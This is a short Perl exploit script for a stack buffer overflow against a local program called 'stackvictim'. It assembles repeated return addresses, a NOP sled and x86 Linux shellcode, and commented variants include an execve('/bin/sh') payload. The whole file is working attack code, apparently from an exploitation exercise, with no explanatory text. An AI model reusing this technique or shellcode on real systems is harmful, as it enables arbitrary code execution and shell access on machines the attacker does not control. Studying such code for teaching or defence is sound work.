#!/usr/bin/perl

# execv /bin/sh
#$shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" .
# "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" .
# "\x80\xe8\xdc\xff\xff\xff/bin/sh";

# exit(0)
#$shellcode = "\x31\xdb\x89\xd8\x40\xcd\x80";

# exit(1)
#$shellcode = "\x31\xdb\x89\xd8\x43\x40\xcd\x80";

# exit(139) 0x8b
#$shellcode = "\x31\xdb\x89\xd8\xb3\x8b\x40\xcd\x80";

# write() to stdout "0wn3d!"
#$shellcode = "\xeb\x15\x59\x31\xd2\xb2\x07\x31\xdb\x89\xd8\xb0\x04\x43\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xe6\xff\xff\xff0wn3d!\n";

# printf()
$shellcode = "\xeb\x0e\xb8\x40\x83\x04\x08\xff\xd0\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xed\xff\xff\xff0wn3d libc style!";
# printf() for debug version
#$shellcode = "\xeb\x0e\xb8\x74\x83\x04\x08\xff\xd0\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xed\xff\xff\xff0wn3d libc style!";

$ret = 0xbffff5d8; # take ebp value during normal run, will probably point to nop's during exploitation
$buf = 108;
$egg = 2000;
$nop = "\x90";
$offset = 0;

if (@ARGV == 1) { $offset = $ARGV[0]; }

$addr = pack('l', ($ret + $offset));
for ($i = 0; $i < $buf; $i += 4) {
 $buffer .= $addr;
}

for ($i = 0; $i < ($egg - length($shellcode)); $i++) {
 $buffer .= $nop;
}

$buffer .= $shellcode;

exec("./stackvictim", $buffer, 0);
